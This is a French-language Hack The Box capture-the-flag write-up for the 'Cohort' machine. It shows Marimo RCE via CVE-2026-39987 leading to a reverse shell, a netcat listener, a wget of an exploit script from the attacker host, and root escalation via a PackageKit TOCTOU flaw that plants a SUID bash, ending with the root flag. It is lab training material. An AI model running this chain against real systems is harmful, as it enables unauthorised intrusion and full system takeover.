# COHORT — HACK THE BOX

## 1. EXPLOITATION WEB — MARIMO

### Découverte du sous-domaine

Pendant l'énumération de l'application Cohort, découverte d'un sous-domaine :

```text
nb-1be3782a8afd3ad5.cohort.htb
```

L'accès à ce sous-domaine révèle une page de connexion intitulée `marimo`, avec un formulaire demandant un Access Token / Password.

Marimo est un environnement de notebooks Python interactifs.

### Identification de la vulnérabilité

Recherche avec SearchSploit :

```bash
searchsploit marimo
```

Résultat :

```text
Marimo 0.20.4 - RCE
multiple/webapps/52673.py
```

L'exploit référencé concerne CVE-2026-39987, une vulnérabilité de type Remote Code Execution (RCE) via le WebSocket `/terminal/ws`.

Le premier lancement a rencontré une erreur de dépendance Python :

```text
module 'websocket' has no attribute 'create_connection'
```

Après correction de la dépendance `websocket-client`, le PoC a permis d'obtenir une exécution de commandes à distance et un reverse shell.

### Reverse shell

Écoute sur la machine attaquante :

```bash
rlwrap nc -lvnp 4444
```

Connexion reçue :

```text
Connection received on 10.129.244.174
marimo@cohort:~$
```

L'utilisateur obtenu est `marimo`.

---

## 2. ÉNUMÉRATION LOCALE

### Informations sur l'utilisateur

```bash
whoami
```

Résultat :

```text
marimo
```

### Recherche des binaires SUID

```bash
find / -perm -u=s 2>/dev/null
```

Plusieurs binaires SUID standards ont été identifiés, notamment :

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
```

La présence de ces binaires n'a pas immédiatement permis une élévation de privilèges.

### Tentative sudo

```bash
sudo su
```

Résultat :

```text
sudo: 3 incorrect password attempts
```

Aucun accès root via sudo avec le compte `marimo`.

---

## 3. ÉLÉVATION DE PRIVILEGES — ROOT

### Identification de CVE-2026-41651

Une nouvelle piste a été explorée : CVE-2026-41651, intitulée :

**Pack2TheRoot — PackageKit TOCTOU Privilege Escalation**

Exploit :

```text
https://github.com/0xBlackash/CVE-2026-41651/
```

Le script a été transféré depuis la machine attaquante :

```bash
wget http://10.10.14.189:8000/CVE-2026-41651.py
```

Puis exécuté :

```bash
python3 CVE-2026-41651.py
```

### Résultat de l'exploitation

Le script a confirmé :

```text
[+] SUID drop directory: /var/tmp
[+] Package format: DEB
[+] Payload installs SUID bash to: /var/tmp/.suid_bash
```

Après exploitation de la condition de course TOCTOU sur une transaction PackageKit :

```text
[+] Confirmed: /var/tmp/.suid_bash is SUID root
```

Le script a ensuite lancé Bash avec l'option `-p`, permettant de conserver l'UID effectif privilégié.

### Vérification de l'accès root

```bash
id
```

Résultat :

```text
uid=1000(marimo) gid=1000(marimo) euid=0(root)
```

Puis :

```bash
whoami
```

Résultat :

```text
root
```

**Élévation de privilèges réussie.**

---

## 4. ROOT FLAG

Commande :

```bash
cat /root/root.txt
```

Résultat :

```text
bed2872fe1b889681c56f8146174010d
```

<badge color="success">ROOT — OWNED</badge>

---

## 5. RÉCAPITULATIF DU CHEMIN D'ATTAQUE

```text
Cohort
  |
  +-- Découverte du sous-domaine Marimo
  |
  +-- CVE-2026-39987
  |     |
  |     +-- RCE pré-authentification via WebSocket
  |     |
  |     +-- Reverse shell
  |           |
  |           +-- Utilisateur : marimo
  |
  +-- Énumération locale
  |
  +-- CVE-2026-41651
        |
        +-- PackageKit TOCTOU
        |
        +-- Création d'un binaire Bash SUID root
        |
        +-- Shell root
              |
              +-- Root flag récupéré
```

**Résultat final : accès root obtenu sur Cohort.**